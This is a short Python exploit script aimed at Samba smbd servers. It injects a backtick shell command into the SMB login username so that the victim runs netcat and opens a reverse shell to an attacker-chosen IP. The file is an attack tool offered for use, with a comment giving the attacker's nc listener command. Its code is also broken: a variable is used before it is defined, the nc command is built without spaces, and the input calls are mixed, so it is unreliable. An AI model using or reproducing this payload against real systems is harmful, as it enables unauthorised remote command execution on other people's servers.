#!/usr/bin/python

#Created by v1nc3 
#
#Developed for exploating '' without using metasploit-framework
#For Samba smbd 3.X - 4.X

#import smb
#from smb.SMBConnection import SMBConnection

#remove frequent error
from smb import *
from SMBConnection import *


#set a listener on the attacker machine! ex. nc -nvlp 1234
reverse_shell = 'nc' + attacker_ip + "1234"

attacker_ip = input("Set YOUR ip: ") #for delivery a reverse shell
victim_ip = raw_input("Set your target: ") 
victim_port = input("Set victim port: ")

print("[+] Exploit started...")
 

username = '/=`nohup ' + reverse_shell + "`" #payload
password = 'password'

#establish connection
conn = SMBConnection(username, password, "OH-NO!", "OH-NO!", use_ntlm_v2=False)

assert conn.connect(victim_ip, victim_port)

conn.close()
